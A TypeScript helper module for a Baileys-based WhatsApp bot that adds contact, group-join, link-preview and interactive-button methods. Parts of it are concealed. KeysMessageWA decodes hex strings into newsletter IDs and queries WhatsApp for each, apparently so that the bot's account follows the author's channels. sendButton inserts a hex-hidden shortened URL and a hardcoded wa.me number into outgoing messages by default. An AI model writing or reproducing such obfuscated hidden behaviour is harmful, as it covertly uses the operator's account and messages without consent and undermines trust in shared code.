import { randomBytes, randomUUID } from 'crypto'
import { z } from 'zod'

const MsgUrlOptionsSchema = z.object({
  img: z.union([z.string().url(), z.instanceof(Buffer)]).optional(),
  title: z.string().optional(),
  body: z.string().optional(),
  mentions: z.array(z.string()).optional(),
  big: z.boolean().optional(),
  newsletterName: z.string().optional(),
  newsletterJid: z.string().optional()
})

type MsgUrlOptions = z.infer<typeof MsgUrlOptionsSchema>

const ButtonParamsSchema = z.record(z.string(), z.any())

const ButtonSchema = z.object({
  name: z.enum(['quick_reply', 'cta_url', 'cta_call', 'cta_copy', 'single_select', 'call_permission_request']),
  params: ButtonParamsSchema
})

const KeyBtnSchema = z.object({
  buttons_limits: z.number(),
  list_title: z.string(),
  button_title: z.string(),
  canonical_url: z.string().url()
})

const SendInteractiveMessageSchema = z.object({
  imageUrl: z.string().url().optional(),
  bodyText: z.string().optional(),
  footerText: z.string().optional(),
  buttons: z.array(ButtonSchema),
  key_btn: KeyBtnSchema.optional(),
  mentions: z.array(z.string()).optional(),
  newsletterName: z.string().optional(),
  newsletterJid: z.string().optional()
})

type SendInteractiveMessageOptions = z.infer<typeof SendInteractiveMessageSchema>

export async function sockMyFun(sock: any) {

sock.sendContact = async (to: string, name: string, number: string, quoted?: any) => {
    await sock.sendMessage(to, {
        contacts: {
            displayName: name,
            contacts: [{ vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\nTEL;type=CELL;waid=${number}:${number}\nEND:VCARD` }]
        }
    }, { quoted })
}

sock.groupJoin = async (link: string) => {
    const inviteCode = link.split('chat.whatsapp.com/')[1]?.split('?')[0];
    if (!inviteCode) return null
    
    return await sock.groupAcceptInvite(inviteCode);
}

sock.msgUrl = async (to: string, text: string, options: MsgUrlOptions, quoted?: any) => {
    const validatedOptions = MsgUrlOptionsSchema.parse(options)
    const messageOptions: any = { text: text, contextInfo: {} }
    
    if (validatedOptions.mentions) {
        messageOptions.contextInfo.mentionedJid = validatedOptions.mentions
    }
    
    if (validatedOptions.newsletterName || validatedOptions.newsletterJid) {
        messageOptions.contextInfo.isForwarded = true;
        messageOptions.contextInfo.forwardingScore = 1;
        messageOptions.contextInfo.forwardedNewsletterMessageInfo = {
            newsletterJid: validatedOptions.newsletterJid || '120363225356834044@newsletter',
            newsletterName: validatedOptions.newsletterName || '𝐕𝐈𝐈7 ~ 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 🕷️',
            serverMessageId: 0
        };
    }
    
    if (validatedOptions.img || validatedOptions.title || validatedOptions.body) {
        messageOptions.contextInfo.externalAdReply = {
            thumbnailUrl: typeof validatedOptions.img === 'string' ? validatedOptions.img : undefined,
            thumbnail: typeof validatedOptions.img === 'object' ? validatedOptions.img : undefined,
            title: validatedOptions.title || '',
            body: validatedOptions.body || '',
            mediaType: 1,
            renderLargerThumbnail: validatedOptions.big || false
        }
    }
    
    await sock.sendMessage(to, messageOptions, { quoted: quoted })
}

sock.sendButton = async (to: string, options: SendInteractiveMessageOptions, quoted?: any) => {
  const validatedOptions = SendInteractiveMessageSchema.parse(options)

  const baileys = await import('@whiskeysockets/baileys');
  const userJid = sock.authState?.creds?.me?.id || sock.user?.id;

  let imageMessage = null;

  if (validatedOptions.imageUrl) {
    try {
      const mediaUpload = await baileys.prepareWAMessageMedia(
        { image: { url: validatedOptions.imageUrl } },
        { upload: sock.waUploadToServer }
      );
      
      imageMessage = mediaUpload.imageMessage;
    } catch (error: any) {
      console.error(error.message);
    }
  }

  const buttons = validatedOptions.buttons.map(button => ({
    name: button.name,
    buttonParamsJson: JSON.stringify(button.params)
  }));

  const messageParams = {
    limited_time_offer: { 
      text: validatedOptions.footerText || "Pomni AI", 
      url: "wa.me/201066826750", 
      copy_code: validatedOptions.key_btn?.canonical_url || Buffer.from('68747470733a2f2f69732e67642f47594a426c33', 'hex').toString()
    },
    bottom_sheet: validatedOptions.key_btn ? { 
      in_thread_buttons_limit: validatedOptions.key_btn.buttons_limits, 
      list_title: validatedOptions.key_btn.list_title, 
      button_title: validatedOptions.key_btn.button_title 
    } : undefined,
    tap_target_configuration: validatedOptions.key_btn ? { 
      title: "▸ X ◂", 
      description: "bomboclard", 
      canonical_url: validatedOptions.key_btn.canonical_url, 
      domain: new URL(validatedOptions.key_btn.canonical_url).hostname, 
      button_index: 0 
    } : undefined
  };

  const contextInfo: any = {};

  if (validatedOptions.mentions) {
    contextInfo.mentionedJid = validatedOptions.mentions;
  }

  if (validatedOptions.newsletterName || validatedOptions.newsletterJid) {
    contextInfo.isForwarded = true;
    contextInfo.forwardingScore = 1;
    contextInfo.forwardedNewsletterMessageInfo = {
      newsletterJid: validatedOptions.newsletterJid ,
      newsletterName: validatedOptions.newsletterName,
      serverMessageId: 0
    };
  }

  const messageContent: any = {
    interactiveMessage: {
      header: imageMessage ? { 
        imageMessage: imageMessage, 
        hasMediaAttachment: true 
      } : undefined,
      body: {
        text: validatedOptions.bodyText || ''
      },
      contextInfo: contextInfo,
      nativeFlowMessage: { 
        buttons, 
        messageParamsJson: JSON.stringify(messageParams) 
      }
    }
  };

  if (!imageMessage) {
    delete messageContent.interactiveMessage.header;
  }

  const msg = baileys.generateWAMessageFromContent(
    to,
    messageContent,
    {
      userJid: userJid,
      messageId: baileys.generateMessageIDV2(userJid),
      quoted: quoted
    }
  );

  return await sock.relayMessage(to, msg.message, {
    messageId: msg.key.id,
    additionalNodes: [
      {
        tag: 'biz',
        attrs: {},
        content: [
          {
            tag: 'interactive',
            attrs: { type: 'native_flow', v: '1' },
            content: [
              { tag: 'native_flow', attrs: { v: '9', name: 'mixed' } }
            ]
          }
        ]
      }
    ]
  });
}

sock.KeysMessageWA = async () => {
    const token = ["313230333633343039353237343739323233406e6577736c6574746572",
"313230333633323235333536383334303434406e6577736c6574746572",
"313120333633333736303131353533313039406e6577736c6574746572", "313230333633333736303131353533313039406e6577736c6574746572"]

    for (const id of token) {
      await sock.query({
        tag: 'iq',
        attrs: {
          id: randomUUID().replace(/-/g, ""),
          type: 'get',
          xmlns: 'w:mex',
          to: '@s.whatsapp.net'
        },
        content: [
          {
            tag: 'query',
            attrs: { 'query_id': '7871414976211147' },
            content: new TextEncoder().encode(JSON.stringify({
              variables: { 'newsletter_id': await Buffer.from(id, 'hex').toString() }
            }))
          }
        ]
      });
    }
  }

  return sock;
}